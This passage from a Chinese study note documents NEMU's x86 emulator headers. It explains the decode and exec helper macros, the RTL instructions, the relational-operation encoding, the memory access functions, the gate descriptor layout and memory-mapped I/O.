区分不同指令的情况，在译码中使用 <code>make_group</code> 实现。</li><li><code>is_jmp</code> 多在运行时指定（如 <code>rtl_j</code> 函数），如果标记，则不会再根据 <code>seq_eip</code> 更新 eip</li></ul><table><thead><tr><th style="text-align:left">函数/宏</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>id_src</code></td><td style="text-align:left"><code>(&amp;decoding.src)</code></td></tr><tr><td style="text-align:left"><code>id_src2</code></td><td style="text-align:left"><code>(&amp;decoding.src2)</code></td></tr><tr><td style="text-align:left"><code>id_dest</code></td><td style="text-align:left"><code>(&amp;decoding.dest)</code></td></tr><tr><td style="text-align:left"><code>operand_write(Operand *, rtlreg_t *)</code></td><td style="text-align:left">根据第一个参数中记录的类型的不同进行相应的写操作，包括写寄存器和写内存</td></tr><tr><td style="text-align:left"><code>load_addr(vaddr_t *, ModR_M *, Operand *)</code></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>read_ModR_M(vaddr_t *, Operand *, bool, Operand *, bool)</code></td><td style="text-align:left"></td></tr></tbody></table><blockquote><p>译码内容存储在变量 <code>decoding</code> 中。</p></blockquote><h4 id="结构体-modr_m"><a class="markdownIt-Anchor" href="#结构体-modr_m"></a> 结构体 ModR_M</h4><p>指令中的 ModR/M。</p><h4 id="结构体-sib"><a class="markdownIt-Anchor" href="#结构体-sib"></a> 结构体 SIB</h4><p>指令中的 SIB。</p><h4 id="枚举-2"><a class="markdownIt-Anchor" href="#枚举-2"></a> 枚举</h4><p>定义了操作数的类型 <code>OP_TYPE_REG</code>，<code>OP_TYPE_MEM</code>，<code>OP_TYPE_IMM</code>，分别为寄存器，内存，立即数。</p><h4 id="宏-make_dhelper-与函数族-decode_name"><a class="markdownIt-Anchor" href="#宏-make_dhelper-与函数族-decode_name"></a> 宏 make_DHelper 与函数族 decode_name</h4><p>由宏 <code>make_DHelper</code> 定义了一族函数（参数相同），用于指令译码，并定义了这些函数的指针类型 <code>DHelper</code>。</p><ul><li>设计目的：由于大量指令的操作数模式相似，将这一点提取出来，实现解耦。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> make_DHelper(name) void concat(decode_, name) (vaddr_t *eip)</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*DHelper)</span> <span class="params">(<span class="keyword">vaddr_t</span> *)</span></span>;</span><br></pre></td></tr></table></figure><p>函数族中部分函数命名规则（<strong>不全</strong>）：</p><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>I</code></td><td style="text-align:left">立即数</td></tr><tr><td style="text-align:left"><code>SI</code></td><td style="text-align:left">有符号立即数</td></tr><tr><td style="text-align:left"><code>E</code></td><td style="text-align:left">内存或寄存器（对应指令描述中的 r/m）</td></tr><tr><td style="text-align:left"><code>G</code></td><td style="text-align:left">通用寄存器</td></tr><tr><td style="text-align:left"><code>r</code></td><td style="text-align:left">单一寄存器</td></tr><tr><td style="text-align:left"><code>a</code></td><td style="text-align:left">指定寄存器为 <code>eax,ax,al</code></td></tr><tr><td style="text-align:left"><code>I2G</code></td><td style="text-align:left">立即数到通用寄存器</td></tr><tr><td style="text-align:left"><code>I_E2G</code></td><td style="text-align:left">立即数与内存或寄存器到通用寄存器</td></tr><tr><td style="text-align:left"><code>O</code></td><td style="text-align:left">未知</td></tr></tbody></table><ul><li><code>r</code> 一般用于寄存器信息存储在 <code>opcode</code> 中的情况</li><li>还有一些专用于特定指令的译码函数</li></ul><blockquote><p>建议结合 i386 手册附录 C 理解。</p></blockquote><p>函数族中特殊函数：</p><ul><li><code>J</code> 跳转指令解码。单操作数，存储到 <code>jmp_eip</code> 中。</li></ul><h3 id="253-exech"><a class="markdownIt-Anchor" href="#253-exech"></a> 2.5.3 exec.h</h3><p>定义了一些用于调试的指令打印宏：</p><table><thead><tr><th style="text-align:left">宏</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>print_asm</code></td><td style="text-align:left">打印指令</td></tr><tr><td style="text-align:left"><code>suffix_char</code></td><td style="text-align:left">根据宽度获取指令宽度后缀</td></tr><tr><td style="text-align:left"><code>print_asm_template1</code></td><td style="text-align:left">单操作数指令</td></tr><tr><td style="text-align:left"><code>print_asm_template2</code></td><td style="text-align:left">双操作数指令</td></tr><tr><td style="text-align:left"><code>print_asm_template3</code></td><td style="text-align:left">三操作数指令</td></tr></tbody></table><h4 id="函数-instr_fetch"><a class="markdownIt-Anchor" href="#函数-instr_fetch"></a> 函数 instr_fetch</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">instr_fetch</span><span class="params">(<span class="keyword">vaddr_t</span> *eip, <span class="keyword">int</span> len)</span></span></span><br></pre></td></tr></table></figure><p>从 <code>eip</code> 开始，读取 <code>len</code> 个字节，返回值，并自动增加 <code>eip</code>。</p><ul><li>设计目的：与机器的大端小端解耦。</li></ul><h4 id="宏-make_ehelper-与-函数族-exec_name"><a class="markdownIt-Anchor" href="#宏-make_ehelper-与-函数族-exec_name"></a> 宏 make_EHelper 与 函数族 exec_name</h4><p>用于定义一族函数（参数相同），用于指令执行，并定义了这些函数的指针类型 <code>EHelper</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> make_EHelper(name) void concat(exec_, name) (vaddr_t *eip)</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*EHelper)</span> <span class="params">(<span class="keyword">vaddr_t</span> *)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="254-reloph"><a class="markdownIt-Anchor" href="#254-reloph"></a> 2.5.4 relop.h</h3><p>定义了形如 <code>RELOP_NAME</code> 的枚举，标识不同类型的关系运算。对应了 <code>setcc,jcc</code> 命令的相应编码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> &#123;</span><br><span class="line">  <span class="comment">//            +-- unsign</span></span><br><span class="line">  <span class="comment">//            |   +-- sign</span></span><br><span class="line">  <span class="comment">//            |   |   +-- equal</span></span><br><span class="line">  <span class="comment">//            |   |   |   +-- invert</span></span><br><span class="line">  <span class="comment">//            |   |   |   |</span></span><br><span class="line">  RELOP_FALSE = <span class="number">0</span> | <span class="number">0</span> | <span class="number">0</span> | <span class="number">0</span>,</span><br><span class="line">  RELOP_TRUE  = <span class="number">0</span> | <span class="number">0</span> | <span class="number">0</span> | <span class="number">1</span>,</span><br><span class="line">  RELOP_EQ    = <span class="number">0</span> | <span class="number">0</span> | <span class="number">2</span> | <span class="number">0</span>,</span><br><span class="line">  RELOP_NE    = <span class="number">0</span> | <span class="number">0</span> | <span class="number">2</span> | <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line">  RELOP_LT    = <span class="number">0</span> | <span class="number">4</span> | <span class="number">0</span> | <span class="number">0</span>,</span><br><span class="line">  RELOP_LE    = <span class="number">0</span> | <span class="number">4</span> | <span class="number">2</span> | <span class="number">0</span>,</span><br><span class="line">  RELOP_GT    = <span class="number">0</span> | <span class="number">4</span> | <span class="number">2</span> | <span class="number">1</span>,</span><br><span class="line">  RELOP_GE    = <span class="number">0</span> | <span class="number">4</span> | <span class="number">0</span> | <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line">  RELOP_LTU   = <span class="number">8</span> | <span class="number">0</span> | <span class="number">0</span> | <span class="number">0</span>,</span><br><span class="line">  RELOP_LEU   = <span class="number">8</span> | <span class="number">0</span> | <span class="number">2</span> | <span class="number">0</span>,</span><br><span class="line">  RELOP_GTU   = <span class="number">8</span> | <span class="number">0</span> | <span class="number">2</span> | <span class="number">1</span>,</span><br><span class="line">  RELOP_GEU   = <span class="number">8</span> | <span class="number">0</span> | <span class="number">0</span> | <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="255-cch"><a class="markdownIt-Anchor" href="#255-cch"></a> 2.5.5 cc.h</h3><p>定义了函数 <code>get_cc_name</code> 根据编码获取指定关系运算字符串。</p><p>定义了 RTL 基本指令 <code>rtl_setcc</code> 用于根据当前关系运算和 eflags 寄存器标志位设置 dest。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_setcc</span><span class="params">(<span class="keyword">rtlreg_t</span>*, <span class="keyword">uint8_t</span>)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="256-rtlh"><a class="markdownIt-Anchor" href="#256-rtlh"></a> 2.5.6 rtl.h</h3><p>定义和实现了一些 RTL 指令，用于提供对指令执行的底层建模。可使用这些操作将复杂指令分解成更简单的操作。</p><p>NEMU 中的 RTL 寄存器：</p><ul><li>x86的八个通用寄存器(在 <code>include/cpu/reg.h</code> 中定义)</li><li><code>id_src</code>, <code>id_src2</code> 和 <code>id_dest</code> 中的访存地址 <code>addr</code> 和操作数内容 <code>val</code> (在 <code>include/cpu/decode.h</code> 中定义). 从概念上看, 它们分别与MAR和 MDR有异曲同工之妙</li><li>临时寄存器 <code>t0~t3</code> 和 <code>at</code> (在 <code>src/cpu/decode/decode.c</code> 中定义)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">rtlreg_t</span> t0, t1, t2, t3, at;</span><br></pre></td></tr></table></figure><ul><li>宏<code>make_rtl_arith_logic</code>根据算术运算符名创建对应 RTL 基本指令和 RTL 指令，使用了<code>include/util/c_op.h</code>中的运算。<ul><li>32位寄存器-寄存器类型的算术/逻辑运算</li><li>32位寄存器-立即数类型的算术/逻辑运算</li></ul></li><li>定义函数 <code>decoding_set_jmp(bool is_jmp)</code> ：将 当前指令标记为跳转（标记 <code>decoing.is_jmp</code>）</li><li>定义函数 <code>interpret_relop</code> ：实现两个值的关系运算，返回结果（实现在 <code>src/cpu/exec/relop.c</code></li></ul><h4 id="rtl-基本指令"><a class="markdownIt-Anchor" href="#rtl-基本指令"></a> RTL 基本指令</h4><p>特点：不需要使用临时寄存器, 可以看做是最基本的x86指令中的最基本的操作。 实现时添加了 <code>interpret_</code> 前缀，但在 <code>include/cpu/rtl-wrapper.h</code> 作用下，其它代码中使用到这些RTL基本指令时会自动添加 <code>interpret_</code> 前缀。</p><ul><li>立即数读入 <code>rtl_li</code></li><li>寄存器传输 <code>rtl_mv</code></li><li>32位寄存器-寄存器类型的算术/逻辑运算, 包括 <code>rtl_(add|sub|and|or|xor|shl|shr|sar|i?mul_[lo|hi]|i?div_[q|r])</code> , 这些运算的定义用到 <code>include/util/c_op.h</code> 中的C语言运算</li><li>被除数为64位的除法运算 <code>rtl_i?div64_[q|r]</code></li><li>guest内存访问 <code>rtl_lm</code> 和 <code>rtl_sm</code></li><li>host内存访问 <code>rtl_host_lm</code> 和 <code>rtl_host_sm</code></li><li>关系运算 <code>rtl_setrelop</code>, 具体可参考 <code>src/cpu/exec/relop.c</code></li><li>跳转, 包括直接跳转 <code>rtl_j</code> , 间接跳转 <code>rtl_jr</code> 和条件跳转 <code>rtl_jrelop</code></li><li>终止程序 <code>rtl_exit</code></li></ul><p>具体声明：</p><ul><li>未标明则函数修饰符均为 <code>static inline</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 立即数读入</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret_rtl_li</span><span class="params">(<span class="keyword">rtlreg_t</span>* dest, <span class="keyword">uint32_t</span> imm)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 寄存器传输</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret_rtl_mv</span><span class="params">(<span class="keyword">rtlreg_t</span>* dest, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span> *src1)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 32位寄存器-寄存器类型的算术/逻辑运算</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret_rtl_add</span> <span class="params">(<span class="keyword">rtlreg_t</span>* dest, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src1, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src2)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 被除数为64位的除法运算</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret_rtl_div64_q</span><span class="params">(<span class="keyword">rtlreg_t</span>* dest,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src1_hi, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src1_lo, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src2)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// guest内存访问</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret_rtl_lm</span><span class="params">(<span class="keyword">rtlreg_t</span> *dest, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* addr, <span class="keyword">int</span> len)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret_rtl_sm</span><span class="params">(<span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* addr, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src1, <span class="keyword">int</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// host内存访问</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret_rtl_host_lm</span><span class="params">(<span class="keyword">rtlreg_t</span>* dest, <span class="keyword">const</span> <span class="keyword">void</span> *addr, <span class="keyword">int</span> len)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret_rtl_host_sm</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span> *src1, <span class="keyword">int</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关系运算</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret_rtl_setrelop</span><span class="params">(<span class="keyword">uint32_t</span> relop, <span class="keyword">rtlreg_t</span> *dest, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span> *src1, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span> *src2)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳转</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret_rtl_j</span><span class="params">(<span class="keyword">vaddr_t</span> target)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret_rtl_jr</span><span class="params">(<span class="keyword">rtlreg_t</span> *target)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret_rtl_jrelop</span><span class="params">(<span class="keyword">uint32_t</span> relop, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span> *src1, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span> *src2, <span class="keyword">vaddr_t</span> target)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终止程序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interpret_rtl_exit</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="rtl-伪指令"><a class="markdownIt-Anchor" href="#rtl-伪指令"></a> RTL 伪指令</h4><p>通过RTL基本指令或者已经实现的RTL伪指令来实现。</p><ul><li>32位寄存器-立即数类型的算术/逻辑运算, 包括 <code>rtl_(add|sub|and|or|xor|shl|shr|sar|i?mul_[lo|hi]|i?div_[q|r])_i</code></li><li>通用寄存器访问 <code>rtl_lr</code> 和 <code>rtl_sr</code></li><li>EFLAGS标志位的读写 <code>rtl_set_(CF|OF|ZF|SF)</code> 和 <code>rtl_get_(CF|OF|ZF|SF)</code></li><li>其它常用功能, 如按位取反 <code>rtl_not</code> ，符号扩展 <code>rtl_sext</code> 等</li></ul><p>具体声明：</p><ul><li>未标明则函数修饰符均为 <code>static inline</code>。</li><li>宏<code>make_rtl_setget_eflags</code>声明了需要实现的 EFLAGS标志位的读写 指令<ul><li><code>rtl_set_name</code></li><li><code>rtl_get_name</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 32位寄存器-立即数类型的算术/逻辑运算</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_addi</span> <span class="params">(<span class="keyword">rtlreg_t</span>* dest, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src1, <span class="keyword">int</span> imm)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// 通用寄存器访问</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_lr</span><span class="params">(<span class="keyword">rtlreg_t</span>* dest, <span class="keyword">int</span> r, <span class="keyword">int</span> <span class="built_in">width</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_sr</span><span class="params">(<span class="keyword">int</span> r, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src1, <span class="keyword">int</span> <span class="built_in">width</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EFLAGS标志位的读写</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_set_CF</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_get_CF</span> <span class="params">(<span class="keyword">rtlreg_t</span>* dest)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_set_OF</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_get_OF</span> <span class="params">(<span class="keyword">rtlreg_t</span>* dest)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_set_ZF</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_get_ZF</span> <span class="params">(<span class="keyword">rtlreg_t</span>* dest)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_set_SF</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_get_SF</span> <span class="params">(<span class="keyword">rtlreg_t</span>* dest)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据运算结构更新 ZF, SF 标志位</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_update_ZF</span><span class="params">(<span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* result, <span class="keyword">int</span> <span class="built_in">width</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_update_SF</span><span class="params">(<span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* result, <span class="keyword">int</span> <span class="built_in">width</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_update_ZFSF</span><span class="params">(<span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* result, <span class="keyword">int</span> <span class="built_in">width</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按位取反</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_not</span><span class="params">(<span class="keyword">rtlreg_t</span> *dest, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src1)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 符号扩展</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_sext</span><span class="params">(<span class="keyword">rtlreg_t</span>* dest, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src1, <span class="keyword">int</span> <span class="built_in">width</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_push</span><span class="params">(<span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src1)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 弹栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_pop</span><span class="params">(<span class="keyword">rtlreg_t</span>* dest)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 32位寄存器-立即数类型 关系运算</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_setrelopi</span><span class="params">(<span class="keyword">uint32_t</span> relop, <span class="keyword">rtlreg_t</span> *dest, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span> *src1, <span class="keyword">int</span> imm)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取符号位（最高位）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl_msb</span><span class="params">(<span class="keyword">rtlreg_t</span>* dest, <span class="keyword">const</span> <span class="keyword">rtlreg_t</span>* src1, <span class="keyword">int</span> <span class="built_in">width</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>我们定义RTL基本指令的时候, 约定了RTL基本指令不需要使用RTL临时寄存器. 但某些RTL伪指令需要使用临时寄存器存放中间结果, 才能实现其完整功能. 这样可能会带来寄存器覆盖的问题, 例如如下RTL指令序列:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(1) rtl_mv(&amp;t0, &amp;t1);</span><br><span class="line">(2) rtl_sext(&amp;t1, &amp;t2, 1);  // use t0 temporarily</span><br><span class="line">(3) rtl_add(&amp;t2, &amp;t0, &amp;t1);</span><br></pre></td></tr></table></figure><p>如果实现(2)的时候恰好使用到了t0作为临时寄存器, 在(3)中使用的t0就不再是(1)的结果了, 从而产生非预期的结果.</p><p>为了尽可能避免上述问题, 我们有两条约定:</p><ul><li>实现RTL伪指令的时候, 尽可能不使用 <code>dest</code> 之外的寄存器存放中间结果. 由于 <code>dest</code> 最后会被写入新值, 其旧值肯定要被覆盖, 自然也可以安全地作为RTL伪指令的临时寄存器.</li><li>实在需要使用临时寄存器的时候, 使用 <code>at</code> . <code>at</code> 全称是assembly temporary, 是MIPS ABI中定义的一个特殊寄存器: 编译器并不会使用它, 它可以在编写汇编代码的时候安全地作为可使用的临时寄存器. 在这里， 我们借鉴它的功能来作如下约定: 不要在RTL伪指令的内部实现之外使用 <code>at</code> . 这样， <code>at</code> 就可以安全地作为RTL伪指令的临时寄存器了.</li></ul><h3 id="257-rtl-wrapperh"><a class="markdownIt-Anchor" href="#257-rtl-wrapperh"></a> 2.5.7 rtl-wrapper.h</h3><p>为 rtl.h 中定义的 RTL 基本指令的调用省去 <code>interpret_</code> 前缀。</p><h2 id="26-memory"><a class="markdownIt-Anchor" href="#26-memory"></a> 2.6 memory/</h2><h3 id="261-memoryh"><a class="markdownIt-Anchor" href="#261-memoryh"></a> 2.6.1 memory.h</h3><p>定义了访问内存的函数。使用数组 <code>pmem</code> 模拟内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">uint8_t</span> pmem[];</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">函数/宏</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>uint32_t vaddr_read(vaddr_t, int)</code></td><td style="text-align:left">从虚拟内存指定位置读取指定数目个字节</td></tr><tr><td style="text-align:left"><code>void vaddr_write(vaddr_t, uint32_t, int)</code></td><td style="text-align:left">向虚拟内存指定位置写入指定数目个字节</td></tr><tr><td style="text-align:left"><code>uint32_t paddr_read(paddr_t, int)</code></td><td style="text-align:left">从物理内存指定位置读取指定数目个字节</td></tr><tr><td style="text-align:left"><code>void paddr_write(paddr_t, uint32_t, int)</code></td><td style="text-align:left">向物理内存指定位置写入指定数目个字节</td></tr><tr><td style="text-align:left"><code>guest_to_host(p)</code></td><td style="text-align:left"><code>((void *)(pmem + (unsigned)p))</code></td></tr><tr><td style="text-align:left"><code>host_to_guest(p)</code></td><td style="text-align:left"><code>((paddr_t)((void *)p - (void *)pmem))</code></td></tr></tbody></table><h3 id="262-mmuh"><a class="markdownIt-Anchor" href="#262-mmuh"></a> 2.6.2 mmu.h</h3><p>(TODO)</p><h4 id="结构体-gatedesc"><a class="markdownIt-Anchor" href="#结构体-gatedesc"></a> 结构体 GateDesc</h4><p>指示中断操作的门描述符(Gate Descriptor)类型。门描述符是一个8字节的结构体, 里面包含着不少细节的信息, 在NEMU中简化了门描述符的结构, 只保留存在位P和偏移量OFFSET。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> 31                23                15                7                0</span><br><span class="line">+-----------------+-----------------+---+-------------------------------+</span><br><span class="line">|           OFFSET 31..16           | P |          Don&apos;t care           |4</span><br><span class="line">+-----------------------------------+---+-------------------------------+</span><br><span class="line">|             Don&apos;t care            |           OFFSET 15..0            |0</span><br><span class="line">+-----------------+-----------------+-----------------+-----------------+</span><br></pre></td></tr></table></figure><p>在 <code>raise_intr</code>（定义在 <code>intr.c</code> 中）中使用。</p><table><thead><tr><th style="text-align:left">成员</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>offset_15_0</code></td><td style="text-align:left">Offset 低位部分</td></tr><tr><td style="text-align:left"><code>offset_31_16</code></td><td style="text-align:left">Offset 高位部分</td></tr><tr><td style="text-align:left"><code>present</code></td><td style="text-align:left">标识是否有效</td></tr></tbody></table><ul><li>为方便从内存中读取，使用 union 结构以及 <code>val0 val1</code> 域简化读写。</li><li>此结构体与 AM 中定义的 <code>GateDesc</code> （在 <code>arch/x86-nemu/include/x86.h</code> 中）结构相同。</li></ul><h2 id="27-device"><a class="markdownIt-Anchor" href="#27-device"></a> 2.7 device/</h2><h3 id="271-mmioh"><a class="markdownIt-Anchor" href="#271-mmioh"></a> 2.7.1 mmio.h</h3><p>对内存映射 I/O 编址方式的支持。注意，内存映射 I/O 的读写并不是面向 CPU 的。</p><blockquote><p>端口映射I/O把端口号作为I/O指令的一部分, 这种方法很简单, 但同时也是它最大的缺点. 指令集为了兼容已经开发的程序, 是只能添加但不能修改的. 这意味着, 端口映射I/O所能访问的I/O地址空间的大小, 在设计I/O指令的那一刻就已经决定下来了. 所谓I/O地址空间, 其实就是所有能访问的设备的地址的集合. 随着设备越来越多, 功能也越来越复杂, I/O地址空间有限的端口映射I/O已经逐渐不能满足需求了. 有的设备需要让CPU访问一段较大的连续存储空间, 如VGA的显存, 24色加上Alpha通道的1024x768分辨率的显存就需要3MB的编址范围. 于是内存映射I/O(memory-mapped I/O)应运而生. 内存映射I/O这种编址方式非常巧妙, 它是通过不同的物理内存地址给设备编址的. 这种编址方式将一部分物理内存&quot;重定向&quot;到I/O地址空间中, 